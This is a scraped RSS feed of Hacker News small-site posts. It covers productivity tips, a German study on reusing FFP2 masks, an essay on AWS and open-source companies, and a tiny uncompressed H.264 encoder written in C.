<p><h3><span>Keeping Your Promises</span></h3></p> <p><span>If you say you’ll follow up, you better do it!</span></p> <p><span>The first step to not dropping the ball is making sure you </span> <em>capture</em> <span> your commitments or tasks. So this part of your process should have low friction. Good old sticky notes, task management apps, and note-taking apps are a few common ways to stay on top of this.</span></p> <p><span>And one common trap with sticky notes and to-dos is keeping track of them. To-do lists are meaningless if you don't remember to check them. For this reason, centralize your tasks in one place. This could mean using a single app to capture across devices, or regularly consolidating your commitments into one place after the initial capture.</span></p>  <p><h3><span>The 1-3-5 Rule</span></h3></p> <p><span>The </span> <a href="https://www.themuse.com/advice/a-better-todo-list-the-135-rule" target="_blank"><span>1-3-5 Rule</span></a> <span> is a simple idea that Alexandra Cavoulacos proposed. The premise is that since you can only fit so much in a day, you should keep your to-do list each day to only:</span></p> <p><li><span>1 big thing</span></li></p> <p><li><span>3 medium things</span></li></p> <p><li><span>5 little things</span></li></p>  <p><h3><span>Energy Management</span></h3></p> <p><span>"Time management" is a big topic. After all, how could you effectively manage a team's time and resources if you can't manage your own?</span></p> <p><span>But what is equally important but less often talked about is managing your energy and emotional states. Sometimes you just want to be in a deep focus state for strategy work. Sometimes you just want to blast music and power through emails. Sometimes you feel ready to dive into technical details.</span></p> <p><span>Each state of mind is conducive to certain types of work. It is beneficial to match the work you do with the state you are in, as opposed to just about scheduling tasks.</span></p> <p><span>And in the long run, it is worth asking this question to decide what you want to work on — </span> <a href="https://knowledgeartist.org/article/do-what-gives-you-energy" target="_blank"><span>What gives you energy?</span></a> <span>﻿</span></p>  <p><h3><span>Inbox Zero</span></h3></p> <p><span>Inbox Zero is the practice of keeping your email inbox empty.</span></p> <p><span>Ravi, founder of </span> <a href="https://www.getamna.com/" target="_blank"><span>Amna</span></a> <span>, advocates for establishing a process for triaging email. In particular, he uses the 4 D's in his process:</span></p> <p><li><span>Do: If you can do it now, just make it happen. Do this with emails that take less than 2 minutes to act on.</span></li></p> <p><li><span>Defer: If you can’t get to it now, add it to your to-do list or move these emails to a different folder.</span></li></p> <p><li><span>Delegate: If you believe another person is better suited to help with an issue, delegate it.</span></li></p> <p><li><span>Delete: If it’s spam, or it doesn’t require your attention, delete or archive it.</span></li></p> <p><span>Productivity guru </span> <a href="https://fortelabs.co/" target="_blank"><span>Tiago Forte</span></a> <span> has a similar approach. What he considers the "key to Inbox Zero" is to “touch each email only once.”</span></p>  <p><h3><span>Batching</span></h3></p> <p><span>Your attention is too precious to passively let it follow the most recent thing that demands it. Engage incoming messages and tasks on your terms.</span></p> <p><span>Turn off push notifications. Disable the notification badges on your desktop dock. Schedule dedicated time to check your email and DMs. And set clear communication expectations with your team.</span></p> <p><span>Instead of completing tasks in the order that they come, you can often save time by grouping similar tasks together. It reduces costly context switching and interrupts by consolidating repetitive tasks that are not time-sensitive.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/batch-processing.png"></p>  <p><h3><span>Don't Forget to Rest</span></h3></p> <p><span>As much as the industry and our culture like to glorify "the grind", it just isn't conducive to quality work. Nor is it sustainable. Take the time to recharge. Feed your brain with things unrelated to work. And dive back in refreshed and energized.</span></p>        
          
          
          <p><em>Every month, I send out a newsletter with the latest product learnings and insights.</em></p>
          <p><em>Enter your email below to subscribe.</em></p>

          
        </div></div>]]>
            </description>
            <link>https://informedpm.com/posts/productivity-for-product-managers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813170</guid>
            <pubDate>Sun, 17 Jan 2021 18:12:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On re-use of FFP2 masks]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25813071">thread link</a>) | @tosh
<br/>
January 17, 2021 | https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php | <a href="https://web.archive.org/web/*/https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>





                            <section id="content">


                                <a name="inhalt"></a>

                                                                
                                    
                                    <div>
                                        




	






   

   


   

   
      <div>
      




    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
			
			
		
		
		
	
	
	
	
            <h2 id="a00">Erklärung des Projekts</h2>

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php.media/2011811/titel-kopf-mit-maske.png.scaled/fca7b4ee72013fbb3e460afbc78ef743.png" alt="Schematische Darstellung einer angelegten FFP2 Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div><p><strong>Warum Wiederverwendung von FFP2-Masken für den Privatgebrauch?</strong></p>
<p>FFP2-Masken werden im Gesundheitswesen in Bereichen mit einem erhöhten Infektionsrisiko eingesetzt. Die als Einmalprodukt konstruierten FFP2-Masken sind nach der Nutzung zur Vermeidung weiterer Infektionsrisiken zu entsorgen. Bei der Nutzung von FFP2-Masken für den Privatgebrauch (z. B. Einkaufen) ist mit einer geringeren Erregerbelastung der FFP2-Masken zu rechnen. FFP2-Masken bieten bei richtiger Anwendung einen besseren Schutz als medizinische Gesichtsmasken (OP-Masken). Allerdings sind sie nur begrenzt verfügbar. Daher kann die Wiederverwendung von FFP2-Masken für den Privatgebrauch eine sinnvolle Ergänzung darstellen.</p>
<p>Die Belastung durch Bakterien und Viren wie SARS-CoV-2 ist ein wichtiger Punkt bei einer Wiederverwendung von Masken. Jeder Träger hinterlässt in der Maske Erreger der eigenen Nasen-, Rachen- und Hautflora. Diese lassen sich mit einfachen Verfahren nicht vollständig inaktivieren. Daher kommt nur eine personenbezogene Wiederverwendung in Betracht. Diese Infobroschüre zeigt die Vor- und Nachteile von zwei Alternativen zur Reduzierung möglicher SARS-CoV-2 Erreger: Verfahren "7 Tage trocknen bei Raumluft" und Verfahren "80 °C trockene Hitze".</p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
			
			
		
		
		
	
	
	
	
            <h2 id="a01">Stabilität von SARS-CoV-2 auf/in FFP2-Masken</h2>

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php.media/2011812/oberflaeche-nicht-beruehren.png.scaled/01a6e2d959db8cf8399fa099e8b3abe2.png" alt="Gezeichnete Hand vor einer FFP2 Maske mit dem Hinweis " oberfläche="" nicht="" berühren!""="">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div><p>Für eine Zertifizierung als FFP2-Maske werden die Masken über 24 Stunden bei 70 °C gelagert und im Anschluss muss die Funktionsfähigkeit gewährleistet bleiben. Unsere Untersuchungen haben gezeigt, dass SARS-CoV-2 auf und in FFP2-Masken bei 70 °C nach über einer Stunde noch infektiös bleibt. Erst bei 80 °C trockener Hitze sind nach 60 Minuten keine infektiösen SARS-CoV-2 nachweisbar. Im Vergleich zu anderen Oberflächenmaterialen hat das Filtermaterial eine isolierende Wirkung, so dass die Ergebnisse zur Infektiösität auf anderen glatten Oberflächenmaterialien nicht übertragbar sind. Zudem haben die ersten Untersuchungen ergeben, dass SARS-CoV-2 auch bei Raumtemperatur auf dem porösen Maskenmaterial erst nach mehreren Tagen deutlich an Infektiösität abnimmt.</p>
<p><strong>Daher sollte eine FFP2-Maske nicht an aufeinanderfolgenden Tagen getragen werden.</strong></p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    
    
    	
    
    
    
	
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            <h2 id="a02">Maskenaufbau und Vielfalt</h2>

<div>


            

                
                
                
                
                
                


                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/ffp-maske_infografik_neu_mit_querschnitt_3.png" alt="">
</p>


   

   
            
                </div>





                    </div>

                

        
             


        
            
                
                
            
            <div><p>FFP2-Masken haben unterschiedliche Formen und Haltebänder. Die Masken bestehen aus mehreren Lagen. In der Mitte befinden sich meistens 2-3 Lagen eines Filtervlies (sog. Meltblown Vlies). Das Filtervlies hat eine elektrostatische Ladung. Diese ermöglicht es, feinste Aerosole festzuhalten, die durch die reine Faserdichte des Gewebes nicht aufgefangen werden. Viele Desinfektionsverfahren reduzieren die elektrostatische Ladung und damit die Filterleistung.</p>
<p>Die Masken sind so gestaltet, dass sie an den Rändern dicht dem Gesicht anliegen. Zur Anpassung an die Nasenform ist über dem Nasenrücken ein Bügel angebracht, der vom Tragenden an die individuelle Nasenform anmodelliert werden muss. Ein wesentlicher baulicher Unterschied besteht zwischen Masken mit und solchen ohne Ausatemventil. Masken ohne Ausatemventil filtern sowohl die eingeatmete als auch die ausgeatmete Luft. Masken mit Ventil filtern nur die eingeatmete Luft und bieten kaum Fremdschutz, da die ausgeatmete Luft nicht gefiltert wird.</p>
<p><em><strong> ⇒ Wichtiger Hinweis</strong></em></p>
<p><em>Die Masken sollten nicht zum Trocknen auf/über die Heizung gelegt oder gehängt werden. 30 °C bis 40 °C sind für viele Bakterien und Pilze in feuchten Masken optimale Wachstumsbedingungen.</em></p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
		
		
			
		
	
	
	
	
            <h2 id="a03">Möglichkeiten und Grenzen einfacher Desinfektionsverfahren SARS-CoV-2 und anderer Erreger</h2>



        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_u70.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Unter 70°C</strong></p>
<p>SARS-CoV-2 kann infektiös bleiben und in der Maske befinden sich andere eigene Erreger der Nasen-, Rachen- und Hautflora.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_80.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Bei 80°C</strong></p>
<p>Bei 80°C sind nach 60 Minuten SARS-CoV-2 vollständig inaktiviert, andere Erreger deutlich reduziert. Die Filterleistung bleibt erhalten; die elastischen Haltebänder können an Zugkraft verlieren.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_u105.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Über 105°C</strong></p>
<p>Die Filterleistung kann deutlich beeinträchtigt werden und einzelne Kunststoffe können nicht sichtbare Materialschäden erleiden. Formstabile Masken (Körbchenmodelle) beginnen schon ab 90°C, sich zu verformen.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
		
		
			
		
	
	
	
	
            

<div>


            


        
            
                
                
            
            <div><p>Unsere Untersuchungen haben gezeigt, dass SARS-CoV-2 erst bei Temperaturen von 80°C und einer Einwirkzeit von einer Stunde sicher auf und im Maskenmaterial inaktiviert werden können. Erreger der Nasen-, Rachen- und Hautflora können auf der Maske noch vorhanden sein. Daher darf eine bereits verwendete und erhitzte Maske auch nur von Ihnen selbst erneut getragen werden. Für den gleichen Träger der Maske sind diese (eigenen) Keime im Vergleich zu den (dann …</p></div></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php">https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php</a></em></p>]]>
            </description>
            <link>https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813071</guid>
            <pubDate>Sun, 17 Jan 2021 18:05:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analysing Algorithms: Worst Case Running Time]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813015">thread link</a>) | @luciferreeves
<br/>
January 17, 2021 | https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time | <a href="https://web.archive.org/web/*/https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://thatcomputerscientist.com/analysing-algorithms-worst-case-running-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813015</guid>
            <pubDate>Sun, 17 Jan 2021 17:58:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is AWS the meteor that kills OSS companies?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25812683">thread link</a>) | @tweaker
<br/>
January 17, 2021 | https://gouthamve.dev/is-aws-the-meteor-that-kills-oss-companies/ | <a href="https://web.archive.org/web/*/https://gouthamve.dev/is-aws-the-meteor-that-kills-oss-companies/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


                <figure>
                    <img srcset="https://gouthamve.dev/content/images/size/w300/2021/01/alexander-andrews--Bq3TeSBRdE-unsplash.jpeg 300w,
                                https://gouthamve.dev/content/images/size/w600/2021/01/alexander-andrews--Bq3TeSBRdE-unsplash.jpeg 600w,
                                https://gouthamve.dev/content/images/size/w1200/2021/01/alexander-andrews--Bq3TeSBRdE-unsplash.jpeg 1000w,
                                https://gouthamve.dev/content/images/size/w2000/2021/01/alexander-andrews--Bq3TeSBRdE-unsplash.jpeg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 1170px,
                                2000px" src="https://gouthamve.dev/content/images/size/w2000/2021/01/alexander-andrews--Bq3TeSBRdE-unsplash.jpeg" alt="Is AWS the meteor that kills OSS companies?">
                </figure>
                <section>
                    <div>
                        <p><a href="https://www.elastic.co/blog/licensing-change">Elastic changed the license for Elasticsearch from Apache 2.0 to SSPL</a>. They are following the lead from other similar companies like <a href="https://www.mongodb.com/blog/post/mongodb-now-released-under-the-server-side-public-license">MongoDB</a>, <a href="https://www.confluent.io/blog/license-changes-confluent-platform/">Confluent</a>, <a href="https://www.cockroachlabs.com/blog/oss-relicensing-cockroachdb/">Cockroach Labs</a>, <a href="https://redislabs.com/blog/redis-labs-modules-license-changes/">Redis Labs</a>, <a href="https://blog.timescale.com/blog/how-we-are-building-an-open-source-business-a7701516a480/">Timescale</a> and others. &nbsp;I've written about why I think it is a bad decision here: <a href="https://gouthamve.dev/p/a76639ef-fe6d-4189-a4b9-6e961ab9bd20/">Why I dislike Elastic's license change</a>. Sadly, after several conversations with people, I also come to think of it as inevitable.</p><h3 id="why-is-elastic-doing-this">Why is Elastic doing this?</h3><p>(A lot of this was pieced together with light Googling so the specifics might be off. But I think this is true in principle. I’d love to correct myself if I’m wrong, so please reach out!).</p><p>While I don't know exactly why they changed the licensing, it's not hard to venture a guess. Elastic is a public company with $427Mil in revenue and it needs to maximise the value for its shareholders. I'm not an expert in reading the public reports, but from what I could see, Elastic Cloud is bringing in a large portion of its revenue.</p><p>But it is not the only company that has a hosted Elasticsearch product,<a href="https://www.google.com/search?q=hosted+elasticsearch"> several other companies</a> have one as well. Of these companies, the most notable one is AWS. Elastic is losing a significant amount of revenue to AWS and they want that revenue to flow to them instead.</p><p>But now it's time to take a step back and look at the history. Elasticsearch was released as an Open-Source project under the Apache 2.0 license. As the adoption and community grew the project creators started a company around the project to fund further development. After all, good engineers cost lots of money! The company and community grew really fast and Elasticsearch adoption skyrocketed.</p><p>But seeing the opportunity, many companies started offering a hosted Elasticsearch product and these products competed with Elastic's own managed service. To fend off the competition, Elastic went the Open-Core route where they kept the already useful Elasticsearch under Apache 2.0, and built X-Pack, a suite of closed-source "enterprise" features on top. This worked great, Elastic had the best hosted solution out there, but other companies could also offer a hosted Elasticsearch solution that was useful but not as featureful.</p><p>I think this part of the community is <strong>crucial</strong>. I do want Elastic, the company, to make money, but the pricing is not affordable for everyone, especially small teams and startups. Of course, they could always host it themselves, but managing Elasticsearch clusters is no easy task. To cater to these users looking for <em>cheaper</em> managed hosting, many companies launched hosted Elasticsearch products and they are quite successful with 100s of customers. The companies and competition are a net positive for the community and helped companies that couldn't afford Elastic Cloud adopt Elasticsearch successfully.</p><p>But at some point in this process AWS entered. AWS is a massive beast that kills startups. If you're doing a hosted <em>"ProductX"</em> and AWS launches a managed <em>ProductX, </em>people will still go to AWS even if AWS' offering is 3x inferior and 3x pricier. This is because the really big companies already have agreements in place and budgets allocated for AWS. They don't want to deal with the procurement process with a new company which could take months! The AWS service would also be tightly coupled with the IAM, SLAs, and other features in AWS and in general companies would want to consolidate everything in AWS rather than have a provider per service. This makes competing with them very difficult.</p><p>Now AWS launching a managed Elasticsearch is bad for Elastic but likely not as bad for the smaller competitors. If a customer can afford AWS ES, they could as well have paid for Elastic Cloud and all its features. The smaller companies will still lose some customers, but I think lots of them will still stick.</p><p>As AWS ES grew, its customers started demanding more of the closed source features Elastic was building and<a href="https://opendistro.github.io/for-elasticsearch/"> AWS started working on its distribution</a> which took the opensource Elasticsearch code and bundled it along with other opensource plugins which replicated the features of X-Pack. I guess this move forced Elastic to move the entire code base to SSPL. The differentiation they've built as part of X-Pack is no longer a good enough moat for them to fend off AWS.</p><h3 id="wait-can-t-they-happy-with-what-they-make">Wait, can't they happy with what they make?</h3><p>Lets take a step back. Elastic is a public company, but this is happening with startups too! Good engineers cost money. Lots of it. And the startups behind the OSS projects hire lots of great engineers to make the OSS project awesome. They raise millions of dollars from investors to be able to do so. But they also promise the investors a really high return on their investment. The companies expect to grow quickly and maybe IPO in a few years.</p><p>But with AWS in the mix, it is hard to hit all those goals. The IPO timelines need to be stretched. Succeeding as a company is already hard, but when you're competing with AWS, its worse. When this happens, investors are hesitant to invest in the company and as a result, the investment into the project itself is reduced. It makes little business sense to invest as much you'd like to when the returns are not what you're looking for. And some argue that without the VC backed investments, the projects wouldn't have been able to gain traction or become as successful.</p><p>An analogy given to me was about Meteors and Dinosaurs. And AWS launching a managed service is likely a meteor event for the startup. They need to do their best to break it up before it kills them.</p><p>It is the same with Elastic. They're investing a lot of money into Elasticsearch. They're already making a lot of money yes, but lots of members invested in Elastic hoping that it'd make more. Elastic is simply choosing to maximise the returns to its investors <em>while also justifying further investment into the Elasticsearch project</em>.</p><h3 id="how-can-we-fix-this">How can we fix this?</h3><p>tbh, I don't know! Until AWS starts making meaningful partnerships and revenue share agreements with OSS companies, I don't think we will see any changes in the situation. And ofcourse it doesn't make business sense for AWS to do so. But also, I might be idealistic but hear me out, if AWS starts making these agreements, it will allow more OSS companies to thrive and thereby give AWS more things to offer to its customers (via partnerships). So it might even be a net positive for AWS in the long-term.</p><h3 id="but-can-there-be-a-truly-oss-company">But can there be a truly OSS company?</h3><p>I think that if you want to build a successful OSS company, you could also build with a different definition for success. <a href="https://ghost.org/">Ghost</a>, a company that I deeply admire is a non-profit company. From their <a href="https://ghost.org/about/"><em>about</em></a> page:</p><blockquote>We set Ghost up as non-profit foundation so that it would always be true to its users, rather than shareholders or investors.</blockquote><p>This is an interesting take. Can you build a company where you priortise the community and users over profitability? You don't need to be a non-profit, but you could be a bootstrapped, slow growing company that would rejoice if AWS starts offering a managed service. It would be a net positive for the community and users. Ofcourse the revenues won't be high, hence the company would likely never be a public company or attract investment, but it could still be a profitable company that employs 50-100 people in total and slowly grows that number.</p><p>One really cool thing about a small company is that it can't productise or build every single use-case and this gap opens up space for other companies and individuals to innovate. There is now an ecosystem of themes, plugins and other features around Ghost. And people in the ecosystem are empowered to build around Ghost, including hosting services. I'm sure the Ghost founders celebrate the competition rather than feel threatened by it.</p><h3 id="i-m-constantly-learning-">I'm constantly learning!</h3><p>While this is quite interesting, I don't think this model of building a business is not for everyone. I'm not even sure if it is for me :) Given that, I think we will see lesser open source projects in the future. Never say never though, there are companies with Open Source licenses that are doing quite well in our space, like <a href="https://www.hashicorp.com/">Hashicorp</a>. I keep wondering what their secret sauce is.</p><p>Overall I am very interested in this topic and <a href="https://twitter.com/putadent">I'd love to chat</a> about it if you have opinions around this topic. When AWS approached us about <a href="https://aws.amazon.com/grafana/">AMG</a> and <a href="https://aws.amazon.com/prometheus">AMP</a>, I had lots of thoughts, but one of them is that I'll see the whole OSS dilemma play out. We're currently betting on feature differentiation with <a href="https://grafana.com/products/metrics-enterprise/">GME</a>. I will try to share what I can from Grafana Labs' business and other interesting things I come across in this space here!</p>
                    </div>
                </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://gouthamve.dev/is-aws-the-meteor-that-kills-oss-companies/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25812683</guid>
            <pubDate>Sun, 17 Jan 2021 17:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Smallest H.264 encoder in 30 LOC]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25812581">thread link</a>) | @ramshanker
<br/>
January 17, 2021 | https://www.cardinalpeak.com/worlds-smallest-h-264-encoder | <a href="https://web.archive.org/web/*/https://www.cardinalpeak.com/worlds-smallest-h-264-encoder">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently I have been studying the <a href="https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC">H.264 video codec</a> and reading the <a href="http://www.iso.org/iso/iso_catalogue/catalogue_ics/catalogue_detail_ics.htm?csnumber=50726">ISO spec</a>. H.264 a much more sophisticated codec than MPEG-2, which means that a well-implemented H.264 encoder has more compression tools at its disposal than the equivalent MPEG-2 encoder. But all that sophistication comes at a price: H.264 also has a big, complicated specification with a plethora of options, many of which are not commonly used, and it takes expertise to understand which parts are important to solve a given problem.</p>
<p>As a bit of a parlor trick, I decided to write the simplest possible H.264 encoder. I was able to do it in about 30 lines of code — although truth in advertising compels me to admit that it doesn’t actually compress the video at all!</p>
<p>While I don’t want to balloon this blog post with a detailed description of H.264, a little background is in order. An H.264 stream contains the encoded video data along with various parameters needed by a decoder in order to decode the video data. To structure this data, the bitstream consists of a sequence of <a href="https://en.wikipedia.org/wiki/Network_Abstraction_Layer">Network Abstraction Layer (NAL) units</a>.</p>
<p>Previous MPEG specifications allowed pictures to be coded as <a href="https://en.wikipedia.org/wiki/Video_compression_picture_types">I-frames, P-frames, or B-frames</a>. H.264 is more complex and wonderful. It allows individual frames to be coded as multiple slices, each of which can be of type I, P, or B or even more esoteric types. This feature can be used in <a href="http://x264dev.multimedia.cx/?p=249">creative ways</a> to achieve different video coding goals. In our encoder we will use one slice per frame for simplicity, and we will use all I-frames.</p>
<p>As with previous MPEG specifications, in H.264 each slice consists of one or more 16×16 <a href="https://en.wikipedia.org/wiki/Macroblock">macroblocks</a>. Each macroblock in our <a href="https://en.wikipedia.org/wiki/Chroma_subsampling">4:2:0 sampling scheme</a> contains 16×16 luma samples, and two 8×8 blocks of chroma samples. For this simple encoder, I won’t be compressing the video data at all, so the samples will be directly copied into the H.264 output.</p>
<p>With that background in mind, for our simplest possible encoder, there are three NALs we have to emit:</p>
<ol>
<li><span>Sequence Parameter Set (SPS): Once per stream</span></li>
<li><span>Picture Parameter Set (PPS): Once per stream</span></li>
<li><span>Slice Header: Once per video frame</span>
<ol type="a">
<li><span>Slice Header information</span></li>
<li><span>Macroblock Header: Once per macroblock</span></li>
<li><span>Coded Macroblock Data: The actual coded video for the macroblock</span></li>
</ol>
</li>
</ol>
<p>Since the SPS, the PPS, and the slice header are static for this application, I was able to hand-code them and include them in my encoder as a sequence of magic bits.</p>
<p>Putting it all together, I came up with the following code for what I call “hello264”:</p>
<pre>#include &lt;stdio.h&gt;</pre>
<pre>#include &lt;stdlib.h&gt;</pre>
<pre>?</pre>
<pre>/* SQCIF */</pre>
<pre>#define LUMA_WIDTH 128</pre>
<pre>#define LUMA_HEIGHT 96</pre>
<pre>#define CHROMA_WIDTH LUMA_WIDTH / 2</pre>
<pre>#define CHROMA_HEIGHT LUMA_HEIGHT / 2</pre>
<pre>?</pre>
<pre>/* YUV planar data, as written by ffmpeg */</pre>
<pre>typedef struct</pre>
<pre>{</pre>
<pre>uint8_t Y[LUMA_HEIGHT][LUMA_WIDTH];</pre>
<pre>uint8_t Cb[CHROMA_HEIGHT][CHROMA_WIDTH];</pre>
<pre>uint8_t Cr[CHROMA_HEIGHT][CHROMA_WIDTH];</pre>
<pre>} __attribute__((__packed__)) frame_t;</pre>
<pre>?</pre>
<pre>frame_t frame;</pre>
<pre>?</pre>
<pre>/* H.264 bitstreams */</pre>
<pre>const uint8_t sps[] = { 0x00, 0x00, 0x00, 0x01, 0x67, 0x42, 0x00,</pre>
<pre>0x0a, 0xf8, 0x41, 0xa2 };</pre>
<pre>const uint8_t pps[] = { 0x00, 0x00, 0x00, 0x01, 0x68, 0xce,</pre>
<pre>0x38, 0x80 };</pre>
<pre>const uint8_t slice_header[] = { 0x00, 0x00, 0x00, 0x01, 0x05, 0x88,</pre>
<pre>0x84, 0x21, 0xa0 };</pre>
<pre>const uint8_t macroblock_header[] = { 0x0d, 0x00 };</pre>
<pre>?</pre>
<pre>/* Write a macroblock's worth of YUV data in I_PCM mode */</pre>
<pre>void macroblock(const int i, const int j)</pre>
<pre>{</pre>
<pre>int x, y;</pre>
<pre>?</pre>
<pre>if (! ((i == 0) &amp;&amp; (j == 0)))</pre>
<pre>{</pre>
<pre>fwrite(&amp;macroblock_header, 1, sizeof(macroblock_header),</pre>
<pre>stdout);</pre>
<pre>}</pre>
<pre>?</pre>
<pre>for(x = i*16; x &lt; (i+1)*16; x++)</pre>
<pre>for (y = j*16; y &lt; (j+1)*16; y++)</pre>
<pre>fwrite(&amp;frame.Y[x][y], 1, 1, stdout);</pre>
<pre>for (x = i*8; x &lt; (i+1)*8; x++)</pre>
<pre>for (y = j*8; y &lt; (j+1)*8; y++)</pre>
<pre>fwrite(&amp;frame.Cb[x][y], 1, 1, stdout);</pre>
<pre>for (x = i*8; x &lt; (i+1)*8; x++)</pre>
<pre>for (y = j*8; y &lt; (j+1)*8; y++)</pre>
<pre>fwrite(&amp;frame.Cr[x][y], 1, 1, stdout);</pre>
<pre>}</pre>
<pre>?</pre>
<pre>/* Write out PPS, SPS, and loop over input, writing out I slices */</pre>
<pre>int main(int argc, char **argv)</pre>
<pre>{</pre>
<pre>int i, j;</pre>
<pre>?</pre>
<pre>fwrite(sps, 1, sizeof(sps), stdout);</pre>
<pre>fwrite(pps, 1, sizeof(pps), stdout);</pre>
<pre>?</pre>
<pre>while (! feof(stdin))</pre>
<pre>{</pre>
<pre>fread(&amp;frame, 1, sizeof(frame), stdin);</pre>
<pre>fwrite(slice_header, 1, sizeof(slice_header), stdout);</pre>
<pre>?</pre>
<pre>for (i = 0; i &lt; LUMA_HEIGHT/16 ; i++)</pre>
<pre>for (j = 0; j &lt; LUMA_WIDTH/16; j++)</pre>
<pre>macroblock(i, j);</pre>
<pre>?</pre>
<pre>fputc(0x80, stdout); /* slice stop bit */</pre>
<pre>}</pre>
<pre>?</pre>
<pre>return 0;</pre>
<pre>}</pre>
<p>(This source code is available as a single file <a href="https://cardinalpeak.com/downloads/hello264.c">here</a>.)</p>
